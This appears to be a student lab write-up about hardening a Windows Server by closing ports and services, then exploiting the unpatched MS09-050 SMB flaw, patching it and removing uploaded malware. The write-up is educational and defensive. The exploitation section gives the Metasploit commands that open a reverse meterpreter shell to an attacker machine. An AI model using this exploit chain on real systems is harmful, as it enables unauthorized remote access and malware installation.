## Objective
In this lab, I will be combining using red-teaming skills on a Windows
Server with hardening concepts to patch the vulnerability and strengthen
the security of the server

## Skills Learned
Using Nmap to identify open ports and verify that they are closed after securing the system<br>
Closing unnecessary ports and disabling services on a Windows Server<br>
Deleting and disabling unneeded services with firewall exceptions<br>
Exploiting a known vulnerability (MS09-050) using Metasploit<br>
Uploading malware on the target system using Metasploit's meterpreter<br>
Running an antivirus on the target system to remove the uploaded malware<br>
Patching vulnerabilities by installing updates and restarting the system<br>

## Finding and Closing Unnecessary Ports

The network topology tells me that the server is on 192.168.1.10, so I
conduct an Nmap scan on the system with a Kali machine to see any ports
that are open. It shows MANY open ports

![image10](https://github.com/user-attachments/assets/b55096c5-df72-4db0-98ad-828fc858e0b3)


![image11](https://github.com/user-attachments/assets/74817e2c-734c-4248-bbab-bbdea3114375)


Now, acting as the Windows Server, I can close some of these ports and
other unnecessary services

![image3](https://github.com/user-attachments/assets/1ce3649e-8f9c-46c2-94e5-dad1d99c7c5e)

Additionally, I can delete and disable some unnecessary services that
had an exception rule applied to them on the firewall

![image6](https://github.com/user-attachments/assets/a9752d73-a656-486d-8a5a-6e7c7e571224)


![image14](https://github.com/user-attachments/assets/82610b7e-5e51-40c0-ad4c-54ac87348b3a)


Finally, conducting another Nmap scan on the server shows that these
unneeded and vulnerable services are now closed, sealing up major
security risks to the system and network, **especially insecure services
such as telnet and ftp.**

![image12](https://github.com/user-attachments/assets/f07474f5-db22-40f8-8bfe-606c42e57cd4)


## Exploiting

Even with some of the major vulnerable services closed up, it's still
possible to exploit this machine through the ports that SMB uses: 139
and 445

I will be exploiting the MS09-050 vulnerability that has not been
patched yet to gain access to the machine and upload malware.

\`use exploit/windows/smb/ms09_050_smb2_negotiate_func_index\`

\`set RHOST 192.168.1.10\`

\`set LHOST 192.168.1.101\`

\`set payload windows/meterpreter/reverse_tcp\`

\`exploit\`

![image8](https://github.com/user-attachments/assets/4462bd91-539d-411c-877b-ce5452a09052)


Now, I can use meterpreter commands that I've learned to navigate to the
Desktop directory of the administrator account and upload my malware as
well as a random text file I created

![image4](https://github.com/user-attachments/assets/43141be3-3988-4839-9528-5f3a55a815e7)


![image2](https://github.com/user-attachments/assets/91333da9-0e78-4460-92f0-aa4a6e34a366)


## Patching the Vulnerability

On the Windows computer, I can install the appropriate updates on the
machine, then restart the machine, to fully patch the vulnerability.

![image7](https://github.com/user-attachments/assets/b06cc76f-f59e-41f1-b9bb-bac7c6a66ebb)


![image5](https://github.com/user-attachments/assets/008eb2ab-17f9-4c65-97fc-aba2d4131b9e)


While the machine was restarting, and when it finished rebooting, I
noticed that I was virtually kicked out of the meterpreter shell on the
linux machine as none of the normal commands were working

![image1](https://github.com/user-attachments/assets/ad72616e-d762-42b5-80e3-d90e32a52ce1)


Then after a while, it alerted me that the session was ended

![image15](https://github.com/user-attachments/assets/98b54699-b6ad-4d78-8326-65065318d454)


Attempting to run the exploit again results in unsuccessful attempts to
gain access to the machine, the vulnerability has been patched and the
exploit no longer works

![image9](https://github.com/user-attachments/assets/eb09baf8-7133-4c3d-b05a-0c85762bbd29)

## Cleaning up the Windows Machine

Even though I was able to patch the vulnerability, some damage had
already been done with the virus being uploaded from the attacker
machine. I can run an antivirus scan on the Windows Server, with
Microsoft Security Essentials, to scan for and remove any malware that
could have been uploaded.

![image13](https://github.com/user-attachments/assets/5664ca49-db1a-4f06-9d73-611fa280643d)
